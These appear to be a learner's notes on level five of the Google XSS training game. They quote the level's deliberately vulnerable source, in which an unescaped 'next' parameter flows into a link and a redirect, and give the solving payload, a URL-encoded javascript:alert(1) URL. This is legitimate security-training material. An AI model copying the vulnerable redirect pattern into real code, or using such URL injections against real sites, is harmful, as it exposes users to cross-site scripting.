Google XSS security game

# level five

## Objective

Inject a script to pop up an alert() in the context of the application

## Mission Description

Cross-site Scripting isn't just about correctly escaping data. Sometimes attackers can do bad things even without injecting new elements in the DOM.

## Observations

replace the "confirm" in the browser bar and leave the form empty.

"Confirm" is a data entry.

### confirm.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    Thanks for signing up, you will be redirected soon...
    <script>
      setTimeout(function() { window.location = '{{ next }}'; }, 5000);
    </script>
  </body>
</html>
```

### level.py

```py
class MainPage(webapp.RequestHandler):
  def render_template(self, filename, context={}):
    path = os.path.join(os.path.dirname(__file__), filename)
    self.response.out.write(template.render(path, context))
 
  def get(self):
    # Disable the reflected XSS filter for demonstration purposes
    self.response.headers.add_header("X-XSS-Protection", "0")
 
    # Route the request to the appropriate template
    if "signup" in self.request.path:
      self.render_template('signup.html', 
        {'next': self.request.get('next')})
    elif "confirm" in self.request.path:
      self.render_template('confirm.html', 
        {'next': self.request.get('next', 'welcome')})
    else:
      self.render_template('welcome.html', {})
     
    return
 
application = webapp.WSGIApplication([ ('.*', MainPage), ], debug=False)
```

### signup.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    <!-- We're ignoring the email, but the poor user will never know! -->
    Enter email: <input id="reader-email" name="email" value="">
 
    <br><br>
    <a href="{{ next }}">Next >></a>
  </body>
</html>
```

### welcome.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    Welcome! Today we are announcing the much anticipated<br><br>
    <img src="/static/logos/level5.png" /><br><br>
 
    <a href="/level5/frame/signup?next=confirm">Sign up</a> 
    for an exclusive Beta.
  </body>
</html>
```

URL: https://xss-game.appspot.com/level5/frame

There's a single clickable link called "Sign Up"
    URL: https://xss-game.appspot.com/level5/frame/signup?next=confirm

    "Next" is a field to enter an email address
        URL: https://xss-game.appspot.com/level5/frame/confirm

    
#### Results from the input fields

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>

  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    <!-- We're ignoring the email, but the poor user will never know! -->
    Enter email: <input id="reader-email" name="email" value="">

    <br><br>
    <a href="confirm">Next >></a>
  </body>
</html>
```

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>

  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    Thanks for signing up, you will be redirected soon...
    <script>
      setTimeout(function() { window.location = 'welcome'; }, 5000);
    </script>
  </body>
</html>
```

### Inspecting element

```javascript
({
  rawHref: document.querySelector("a")?.getAttribute("href"),
  resolvedHref: document.querySelector("a")?.href
})
```
#### Results

```javascript
({
  rawHref: document.querySelector("a")?.getAttribute("href"),
  resolvedHref: document.querySelector("a")?.href
})
{rawHref: 'confirm', resolvedHref: 'https://xss-game.appspot.com/level5/frame/confirm'}
rawHref
: 
"confirm"
resolvedHref
: 
"https://xss-game.appspot.com/level5/frame/confirm"
[[Prototype]]
: 
Object
constructor
: 
ƒ Object()
hasOwnProperty
: 
ƒ hasOwnProperty()
isPrototypeOf
: 
ƒ isPrototypeOf()
propertyIsEnumerable
: 
ƒ propertyIsEnumerable()
toLocaleString
: 
ƒ toLocaleString()
toString
: 
ƒ toString()
valueOf
: 
ƒ valueOf()
__defineGetter__
: 
ƒ __defineGetter__()
__defineSetter__
: 
ƒ __defineSetter__()
__lookupGetter__
: 
ƒ __lookupGetter__()
__lookupSetter__
: 
ƒ __lookupSetter__()
__proto__
: 
(...)
get __proto__
: 
ƒ __proto__()
set __proto__
: 
ƒ __proto__()
```

#### Observations

- rawHref is the literal value generated by the server from next=confirm.
- resolvedHref is the absolute URL the browser constructs from that relative path.

## Results

alert() achieved by injecting directly into the URL expected 'next' result in place of confirmation

```javascript
javascript%3Aalert%281%29
```